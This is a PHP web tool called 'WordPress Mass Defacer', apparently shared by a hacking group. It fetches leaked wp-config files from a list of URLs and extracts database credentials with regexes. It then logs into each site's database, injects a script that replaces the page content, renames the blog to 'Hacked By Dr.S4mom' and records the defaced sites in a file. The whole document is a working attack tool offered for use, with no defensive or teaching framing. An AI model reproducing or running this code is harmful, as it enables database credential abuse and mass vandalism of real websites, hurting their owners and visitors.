<?php
/**
 * @fb : https://www.facebook.com/Cyberteamrox3/
 * @contact: https://www.facebook.com/zee.gov
*/
 
set_time_limit(0);
ini_set('display_errors', 0);
 
echo '<html><head>
<title>WordPress Mass Defacer | CyberTeamRox</title>
<meta content="text/html; charset=utf-8">
<meta name="keywords" content="WordPress Mass Defacer | CyberTeamRox" />
<meta name="description" content="WordPress Mass Defacer | CyberTeamRox" />
<link href="https://pbs.twimg.com/profile_images/576236156573995008/MBmY1005.jpg" rel="SHORTCUT ICON" />
<meta name="author" content="Dr.S4mom" />
<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
<style type="text/css">body { background: url("http://p1.pichost.me/i/13/1360479.jpgg") bottom right no-repeat fixed; background-color:black; td {text-color:white; text-align: center;font-family:Pirata One; text-shadow: 3px 3px 3px red;}</style>
</head><body>';
echo '<center><div style="text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(255, 0, 0), 0px 0px 5px rgb(255, 0, 0); color: rgb(255, 255, 255); font-weight: bold;"><font style="color:yellow;size="2";text-align: center;font-family:Pirata One; text-shadow: 3px 3px 3px yellow;">WordPress Mass Defacer<br><sub>CyberTeamRox</sub></div><br/><img src="https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQJLjYMEd-uAlqgf_RPIGxFcrcVJtvQ3BSERUbp2GVbby3Tc3s8"></center><br>';
 
echo '<form method="POST" action="" ><center><table border="1">
<tr><td style="color: rgb(255, 255, 255);" >Config List:</td><td><textarea name="url" cols="50" rows="10" ></textarea></td></tr>
<tr><td style="color: rgb(255, 255, 255);">Deface :</td><td><textarea name="index" cols="50" rows="10" ></textarea></td></tr></table>
<br><input type="Submit" class="button" value="Submit"><input type="hidden" name="action" value="1"></form></center>';
 
if ($_POST['action']=='1'){
if ($_POST['url']==''){
echo "<center><div class='result'>No Config Found! <br>Make sure you provided a config list!</div><br>";
}else{
$url=$_POST['url'];
$users  = explode("\n",$url);
foreach ($users as $user) {
$user1=trim($user);
$code=file_get_contents2($user1);
preg_match_all('|define.*\(.*\'DB_NAME\'.*,.*\'(.*)\'.*\).*;|isU',$code,$b1);
$db=$b1[1][0];
preg_match_all('|define.*\(.*\'DB_USER\'.*,.*\'(.*)\'.*\).*;|isU',$code,$b2);
$user=$b2[1][0];
preg_match_all('|define.*\(.*\'DB_PASSWORD\'.*,.*\'(.*)\'.*\).*;|isU',$code,$b3);
$db_password=$b3[1][0];
preg_match_all('|define.*\(.*\'DB_HOST\'.*,.*\'(.*)\'.*\).*;|isU',$code,$b4);
$host=$b4[1][0];
preg_match_all('|\$table_prefix.*=.*\'(.*)\'.*;|isU',$code,$b5);
$p=$b5[1][0];
 
$d=@mysql_connect( $host, $user, $db_password ) ;
if ($d){
@mysql_select_db($db );
$source=stripslashes($_POST['index']);
$s2=strToHex(($source));
$s="<script>document.documentElement.innerHTML = unescape(''$s2'');</script>";
$ls=strlen($s)-2;
$sql="update ".$p."options set option_value='a:2:{i:2;a:3:{s:5:\"title\";s:0:\"\";s:4:\"text\";s:$ls:\"$s\";s:6:\"filter\";b:0;}s:12:\"_multiwidget\";i:1;}' where option_name='widget_text'; ";
mysql_query($sql) ;
$sql="update ".$p."options set option_value='a:7:{s:19:\"wp_inactive_widgets\";a:6:{i:0;s:10:\"archives-2\";i:1;s:6:\"meta-2\";i:2;s:8:\"search-2\";i:3;s:12:\"categories-2\";i:4;s:14:\"recent-posts-2\";i:5;s:17:\"recent-comments-2\";}s:9:\"sidebar-1\";a:1:{i:0;s:6:\"text-2\";}s:9:\"sidebar-2\";a:0:{}s:9:\"sidebar-3\";a:0:{}s:9:\"sidebar-4\";a:0:{}s:9:\"sidebar-5\";a:0:{}s:13:\"array_version\";i:3;}' where option_name='sidebars_widgets';";
mysql_query($sql) ;
if (function_exists("mb_convert_encoding") )
{
$source2 = mb_convert_encoding('</title>'.$source.'<DIV style="DISPLAY: none"><xmp>', 'UTF-7');
$source2=mysql_real_escape_string($source2);
$sql = "UPDATE `".$p."options` SET `option_value` = 'Hacked By Dr.S4mom || CyberTeamRox' WHERE `option_name` = 'blogname';"; // Change to your Nick
@mysql_query($sql) ; ;
$sql = "UPDATE `".$p."options` SET `option_value` = 'Hacked by Dr.S4mom' WHERE `option_name` = 'blogdescription';"; // Change to your Nick
@mysql_query($sql) ; ;
$sql= "UPDATE `".$p."options` SET `option_value` = 'UTF-7' WHERE `option_name` = 'blog_charset';";
@mysql_query($sql) ; ;
}
$aa=@mysql_query("select option_value from `".$p."options` WHERE `option_name` = 'siteurl';") ;;
$siteurl=@mysql_fetch_array($aa) ;
$siteurl=$siteurl['option_value'];
$tr.="$siteurl\n";
mysql_close();
}
}
if ($tr)
$filename = 'list.txt';
$fp = fopen($filename, "a+");
$write = fputs($fp, $tr);
fclose($fp);
echo "<center><div class='result'>Defacing Completed 1337 xd ! :)<br><br>";
echo "<center><a href='list.txt' target='_blank'>View List of Defaced Sites</a></div><br/>";
echo "Index changed for <br><br><textarea cols='50' rows='10' >$tr</textarea>";
}
}
 
function strToHex($string)
{
    $hex='';
    for ($i=0; $i < strlen($string); $i++)
    {
        if (strlen(dechex(ord($string[$i])))==1){
        $hex .="%0". dechex(ord($string[$i]));
                }
                else
                {
                $hex .="%". dechex(ord($string[$i]));
                }
    }
    return $hex;
}
 
function file_get_contents2($u){
 
        $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$u);
        curl_setopt($ch, CURLOPT_HEADER, 0);    
   curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0 ");
            $result = curl_exec($ch);
        return $result ;
        }
echo "<center><br><br>&#169; Zeeshan Haxor || CyberTeamRox ";       
?>